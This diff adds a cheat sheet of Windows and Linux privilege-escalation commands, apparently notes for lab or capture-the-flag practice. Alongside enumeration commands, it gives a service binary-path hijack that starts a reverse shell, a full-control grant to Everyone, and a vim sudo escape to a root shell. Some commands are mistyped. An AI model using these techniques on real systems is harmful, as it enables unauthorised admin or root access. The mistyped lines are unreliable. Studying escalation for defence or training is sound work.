@@ -1,0 +1,70 @@
+Windows Privilege Escalation
+-----------------------===
+whoami: current user
+whoami /priv
+Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl : need admin priv
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer : not need admin priv
+net user username
+net user:  all user details
+net user /domain
+net user *name* /domain
+net group /domain
+sc qc daclsvc :to know the binary path
+sc config name_of_exe_file binpath= "\"C:\PrivEsc\reverse.exe\""  :changing the binary path
+net start name_of_exe_file binpath : to start the service for reverseshell
+hostname: generic OS name
+systeminfo | findstr /B /C :"OS Name" /C "OS Version" /C "System Type"
+tasklist /svc : running processes
+route print - routing info
+netstat -ano -active connection,address , process ID
+netsh advfirewall show currentprofile  : firewall details
+netsh advfirewall firewall show rule name=all : all firewall rules
+schtask /query/ fo LIST /v : scheduled task
+wmic product get name, version, vendor : info about patches
+wmic qfe get Caption, Description, HotFixID, InstalledOn: info about updates
+Get-childitem "c:\Program Files"- Recurse | Get-ACL | ?{_.AccessToString -match "Everyone\sAllow\s\sModify"} : powershell script to know the file access vunerability
+mountvol: to check mounted file system
+driverquery.exe /v/fo csv | ConvertFrom-CSV | Select-Object  'Display Name', 'Start Mode', Path : powershell code to check driver upodates
+
+icacls : command-line tool in Windows that is used to view and modify permissions on files and folders
+(OI): This parameter stands for "Object Inherit.
+(CI): This parameter stands for "Container Inherit."
+(F): This parameter stands for "Full Control."
+The (OI)(CI)(F) combination is often used together to apply full control permissions
+icacls "C:\ExampleFolder" /grant Everyone:(OI)(CI)(F)
+
+dir flag* /s /p: display files or directories starting with "flag" in the current directory and its subdirectories. The "/s" switch is used to search recursively in subdirectories, and the "/p" switch is used to display the results one screen at a time.
+
+=================================================================
+Linux Privilege Escalation
+--------------------------
+whoami: current user
+id : info of current user
+sudo -l : to see superuser details
+printenv: environment variable list
+/etc/passwd : all user info 
+hostname: OS name
+cat /etc/issue: all of the OS details
+cat /etc/*-release all of the OS details
+uname -a -kernel info
+ps -a : current process
+ps -x
+ip a - all ip info
+route/route l-route details
+netstat -ano : open local ports and services
+ss -antp    : to see all of the local connection
+ss  :connection
+nmcli dev show : to chek all of the network/dns details 
+grep -Hs iptables /etc/*
+dpkg -l - installed apps
+find / -writable -type d 2>/dev/null : file access vulnerability
+mount: mounted files info
+/bin/lsblk : mounted pertitions file info
+lsmodinfo : to know about kernel modules like drivers
+find / -type f -perm /04000              : SUID info 
+find / -perm -u=s -type f 2>/dev/null    
+find . perm /4000
+grep "CRON" /var/log/cron.log
+sudo vim -c ':!/bin/sh' : Levearge a root terminal through vim (if it is vulnerable to privesc)
+mount -t drvfs 'c:' /mnt/c : (-t drvfs)-This option specifies the type of file system to be mounted. In this case, drvfs refers to the file system driver used by WSL to access Windows drives.
+
